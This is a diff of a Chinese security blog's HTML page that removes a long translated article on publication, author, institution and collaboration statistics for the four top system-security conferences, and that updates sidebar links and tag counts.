-<figure class="third"><br>    <a href="http://oij0laovn.bkt.clouddn.com/3.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/3.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/4.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/4.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/5.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/5.png" width="450"></a><br></figure>
-
-<p>左边的图表证实了上述事实。但是，学生毕业后会放弃他们的研究，因此左图显示了来自博士生圈的分析结果。在第二个图中，我侧重绘制了过去两年内<em>积极</em>研究者的人数（也就是在TOP4会议上至少发表过一篇文章的作者）这一结果证实了我们的研究团体在扩大。<br>让我更感到惊讶的是右图的结果。2005年之前，每年新研究机构的数量在减少，这意味着那时，我们的学术圈建设到达了瓶颈，新成员直接加入圈内已有的活跃机构。2005至2010年，新的研究机构缓慢增加。但是2010年以后，新的研究机构迅速增加，因此我们学术圈的扩张得益于每年新的公司和学校的加盟。</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/6.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/6.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/7.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/7.png" width="450"></a><br></figure>
-
-<p>更多的机构组织意味着更多的合作。每篇文章的平均作者数量在增加（见左图蓝线），单一机构撰写文章的数量反而递减（见右图）。具有最多作者文章奖颁发给了<em>Manufacturing Compromise: The Emergence of Exploit-as-a-Service</em>，该文章由来自6个不同机构的18位作者合写（左图中红线表示了每年最多的合作作者数目）。而在另一极端，数据集里包括了<strong>97篇独立作者的文章</strong>（占3.6%）。这一小团体的领军人物是<em>Niels Provos</em>和<em>Peter Gutmann</em>，每人有4篇独立撰写的文章。</p>
-<pre><code>结论？是的，系统安全领域在快速扩张。每年都有新的研究者和研究团体加入这一学术圈。这一变化带来顶级会议的投稿数量逐年增加，目前会议只采用增加接收文章的数量来应对这一变化。但这并非长远之计，让我们拭目以待。
-</code></pre><h3 id="人员地理分布"><a href="#人员地理分布" class="headerlink" title="人员地理分布"></a>人员地理分布</h3><figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/8.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/8.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/9.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/9.png" width="450"></a><br></figure>
-
-<p>这一数据非常有趣。十年前，系统安全领域被美国学者统治，然而，自那之后，来自其他地区的学者（尤其是欧洲学者）在这一领域内的人数不断增加。现阶段本领域内的国际合作非常普遍，合作论文占总论文的20%之多。尽管如此，右边的图表显示，在合作的论文中，美国学者仍然独领风骚。</p>
-<pre><code>美国学者在系统安全领域内虽占主导地位，但是其他国家的学者正缓步追赶。
-更重要并且令人感到欣喜的是，近年来涌现出越来越多的国际合作论文。
-</code></pre><h3 id="会议委员会"><a href="#会议委员会" class="headerlink" title="会议委员会"></a>会议委员会</h3><p>为了有效应对不断增加的投稿，所有会议都选择了组建大型委员会。从2000年开始，NDSS委员会的人数增加了一倍，Oakland增加了两倍，CCS和Usenix的委员会增加了五倍。<br>总体来看，TOP4会议中共有738为委员会成员。其中25%的人从未在同一时间通过这些会议发表过文章。我想这是一个好现象（不同的看法是，更多的人来自企业领域），同时这也不是一个好现象（他们都有评阅论文的能力吗？）。另一方面，排名前200的作者中有13%的人从未担任过任何会议的委员会成员。为什么呢？没有人邀请他们，还是他们并不想做？我们需要进一步验证。</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/10.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/10.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/11.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/11.png" width="450"></a><br></figure>
-
-<p>随着会议委员会人数的增加，正如左图所示，每位评阅者的评审工作量近乎不变。如果平均每篇文章有3个评审人（2个早期拒绝，4人以上应对有争议的论文），那么每位会议委员会成员需要评审21篇文章。这对组委会来说仍然是巨大的（免费）工作量。其中，NDSS近乎每年工作量都在增加，现在已成为圈中工作量最大的会议（而2000年时却是工作量最小的）。<br>右图显示了每个会议组委会历年的变化。曲线起起伏伏，但是重叠人数在20%到50%。我个人认为这是一个很好的平衡，既有新鲜血液的注入，也有老成员的经验。</p>
-<pre><code>现阶段，TOP4会议通过增加委员会人数和接收更多的论文来有效应对不断增加的投稿。但是这种模式能长期可持续发展吗？我们还能做些什么？
-Oakland仍然采用限制同一作者多篇投稿的方式，但是我想采用更多数据来审视这一问题。从2017年开始，他们计划采用VLDB的方式。点此查看更多信息。
-</code></pre><h3 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h3><p>如果想知道本领域最具影响力的作者是谁（请参看此表）。以下是目前最具影响力的前十位作者：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/12.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/12.png" width="450"></a><br></figure>
-
-<p>完整的列表（包含分类栏目）收录了至少发表过两篇文章以上的作者（<a href="http://s3.eurecom.fr/~balzarot/notes/top4/authors.html" target="_blank" rel="external">此处</a>查找）<br>说明：</p>
-<pre><code>active:作者在圈内发表文章的第一年与最后一年
-max: 作者在同一会议中发表的最多论文数
-chairs:该人物担任TOP4会议主席的次数
-slams:同一年里作者在全部TOP4会议上发表文章的总次数
-tpc: 担任会议委员会成员的次数
-venues:作者在全部会议中发表论文的总数
-top4:作者在TOP4会议中发表论文的比例（1到4）
-co-authors:在TOP4会议中发表合作论文的总数
-avg:每篇论文的平均作者人数
-</code></pre><p>仔细查看图表，我们可以获得以下有趣的信息：<br>在单次会议中发表论文次数最多的作者有5篇（但是有14个作者各发表了4篇）。Dawn Song排名第一，同时也是具有最多合作论文的作者（114篇）。Wenke Lee在28个会议委员会中有任职，他同时也是具有最高Slam数额的教授。在前100人中，只有5位女性（我们期待更多）同时来自欧洲的只有13%（我们期待更多）。<br>总体而言，334位作者在TOP4会议中发表了5篇以上论文。相比之下<a href="http://from-a-to-remzi.blogspot.it/2013/05/the-systems-top-50.html" target="_blank" rel="external">The System top 50</a>统计了系统领域内33个会议中53位学者的信息（本文包含了68位）。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/13.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/13.png" width="450"></a><br></figure>
-
-<p>最后的图表显示，在过去的17年里，单一学者在单一会议中发表论文最多的数目在不断增加。对此有多种解释，但是最有可能的就是成功的研究团体拥有的越来越多的成员（拥有15名以上博士生的研究团体并不罕见）。</p>
-<h3 id="所属机构"><a href="#所属机构" class="headerlink" title="所属机构"></a>所属机构</h3><p>现在让我们来看一下排名前十的研究机构：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/14.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/14.png" width="450"></a><br></figure>
-
-<p>(具有分类栏目的完整图表点击<a href="http://s3.eurecom.fr/~balzarot/notes/top4/affiliations.html" target="_blank" rel="external">此处</a>查看)<br>说明：</p>
-<pre><code>coverage: 该机构在会议中发表（至少一篇）论文的比例
-size:拥有在TOP4会议中发表论文的作者数量
-</code></pre><p>值得注意的几点：</p>
-<ol>
-<li>每个机构都来自美国（第一个非美国的机构ETH排名18）</li>
-<li>伯克利大学几乎在每次会议上都有论文发表（比例高于90%）</li>
-<li>只有一家公司和九家大学（3个都是加州系列大学）。然而，这是因为我人为地将一些大的公司分裂成了不同分支。如果将其名下的研究所汇总，IBM将会排名第4而微软排名第2。</li>
-<li>卡内基梅隆大学是拥有作者人数最多的机构。</li>
-<li>网络安全公司的排名如何？（RSA是网络安全公司类排名最高的，排在第31位）作为一个“系统”群体，我们很高兴看到学术界与商业界的混合。我们的群体仍然太小吗？现在的公司只对BlackHat和VirusBulletin感兴趣吗？或者说只有微软、IBM和谷歌是最主要的安全公司吗？<br>这结果显然令人感到沮丧。也许系统安全学界认为公司不懂研究，而公司认为学界的论文只是纸上谈兵，学校的教授们并不知晓现实世界的情况，也不了解公司在计算机学术会议外，已经付出的努力。我真希望这一想法是错误的。<br>尽管此数据集收录了近700个独立科研机构，但是累积分布函数显示，只有几家机构活跃在此舞台上。事实上，排名前十的机构已经占据了发表论文总数的80%（可参<em>见帕累托分布</em>)。</li>
-</ol>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/15.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/15.png" width="450"></a><br></figure>
-
-<h3 id="团队与合作"><a href="#团队与合作" class="headerlink" title="团队与合作"></a>团队与合作</h3><p>利用这些数据，我们可以编制一个更有趣的图表：如果每位作者用一个结点来表示，那么可以用边线把有合作关系的作者连接起来。不幸的是，图表中有四千四百个结点和一万五千条线，工作量巨大!但是更有趣的是，其中85%的作者从属于一个巨大的簇群！换言之，可以通过追踪合作者找到本领域的每个人。今年只有五位作者发表了三篇以上的论文且不在这个巨网之中（去年有九位）。<br>最大的圈子（也就是标记了每个人与其他人直接关联的最大图表）与参与写作<em>Manufacturing Compromise: The Emergence of Exploit-as-a-Service</em>的十八位作者相一致。有趣的是，再没有比这个更大的网络。<br>如果想做一个更紧凑的图像，我们可以将图表压缩到只包括发表论文数量最少的作者。如果把门槛降到9篇文章，我们还是可以获得166个结点，640条连接线和直径为7的圆，仍然超出制图的限制。<br>如果我们要突显图表中的主要群体，我们需要其他途径来消除噪点。例如，我们可以选择至共同合作过<strong>5</strong>篇文章的作者为分析结点（每人总共有10篇），来查看合作的密切性。这一分析结果显示有91个结点，那么我们可以看到许多有趣的群体：（大图<a href="http://s3.eurecom.fr/~balzarot/notes/top4/main_groups.png" target="_blank" rel="external">点此</a>查看）</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/16.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/16.png" width="450"></a><br></figure>
-
-<p>仍然太大？<br>好吧，下图是选择共同合作过<strong>10</strong>篇文章的作者分析图。这里我们可以看到本领域内教授之间最有效的合作关系。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/17.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/17.png" width="450"></a><br></figure>
-
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul>
-<li><p><strong>如果综合谷歌学术的信息会更好</strong><br>的确如此。如果可以获得每篇论文被引用的相关数据，会提供更加有趣的数据。如有谷歌相关工作人员可以提供帮助，请随时与我联系。</p>
-</li>
-<li><p><strong>如果在作者或机构列表中发现错误怎么办？</strong><br>太好了！请将正确信息发给我，我将进行修改和更新</p>
-</li>
-<li><p><strong>为何不使用DBLP?</strong><br><a href="http://lilicoding.github.io/topresearcher/" target="_blank" rel="external">TopResearcher</a> 使用DBLP来获取包括TOP4会议在内的多数顶级会议的论文列表，然而，多年来DBLP的统计中缺失了许多作者的文章。因此，保险起见，为避免拼写错误产生的统计失误，我自己采用分析姓名的方式进行统计，与DBLP不同的是，我还罗列了每位作者的所有单位。</p>
-</li>
-<li><p><strong>采用动态生成的页面和交互式绘制会更好</strong><br>是的，我同意。如果能够采用图书馆的方式来大面积呈现可定制的图表会更好。如果使用<a href="http://www.yworks.com/products/yfiles" target="_blank" rel="external">yFiles</a>会更适合，然而即便对学术科研来讲，它也并不免费。所以，除非有人给我提供免费的使用权限，不然就无法实现。</p>
-</li>
-<li><p><strong>可以分享你的数据/代码吗？</strong><br>可以的。我计划找时间将所有的东西进行美化，然后在github上与大家分享代码和数据，但是我仅在有限的业余时间里进行此项作业。因此，我希望将这些时间更多的用来添加新数据和分析，因此，尽情期待吧……</p>
-</li>
-<li><p><strong>下一次更新会在什么时候？</strong><br>待明年CCS发布新一轮接收的论文。</p>
-</li>
-<li><p><strong>还有什么其他值得分析的吗？</strong><br>请告诉我，我喜欢绘制图表</p>
-</li>
-</ul>
-<hr>
-<p>转载本文请务必注明，文章出处：《<a href="http://www.csyssec.org/20161230/csysseccircus/" target="_blank" rel="external">计算机系统安全学术圈</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/安全圈子/">安全圈子</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Conference/">Conference</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+  </nav>
 
 </section>
           <aside id="sidebar">
@@ -1641,6 +1554,42 @@ size:拥有在TOP4会议中发表论文的作者数量
               <div class="widget-entry-summary" style="margin: 0;">
             
 
+              <h6 style="margin: 0;"><a href="/20170101/memorysafety-defense/">内存持久战之防御措施</a></h6>
+              <span>一月 1, 2017</span>
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a></h6>
+              <span>一月 1, 2017</span>
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170101/memorysafety/">内存持久战之内存安全性</a></h6>
+              <span>一月 1, 2017</span>
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
               <h6 style="margin: 0;"><a href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a></h6>
               <span>一月 1, 2017</span>
             </div>
@@ -1719,42 +1668,6 @@ size:拥有在TOP4会议中发表论文的作者数量
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20161230/stackbufferflow/">经典栈缓冲区溢出</a></h6>
-              <span>十二月 30, 2016</span>
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20161230/linux-exploit/">Linux(X86)漏洞利用</a></h6>
-              <span>十二月 30, 2016</span>
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20161230/csysseccircus/">计算机系统安全学术圈</a></h6>
-              <span>十二月 30, 2016</span>
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1765,7 +1678,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -1775,7 +1688,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">3</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">6</span></li></ul>
     </div>
   </div>
 
@@ -1785,7 +1698,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.5px;">Exploit</a> <a href="/tags/Kernel/" style="font-size: 12.5px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/Overflow/" style="font-size: 12.5px;">Overflow</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 12.5px;">Stack</a> <a href="/tags/System/" style="font-size: 15px;">System</a>
+      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 18px;">Exploit</a> <a href="/tags/Kernel/" style="font-size: 12px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 14px;">Linux</a> <a href="/tags/Memory/" style="font-size: 14px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 12px;">Overflow</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 12px;">Stack</a> <a href="/tags/System/" style="font-size: 16px;">System</a>
     </div>
   </div>
 
@@ -1795,7 +1708,7 @@ size:拥有在TOP4会议中发表论文的作者数量
     <h3 class="widget-title">归档</h3>
 
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
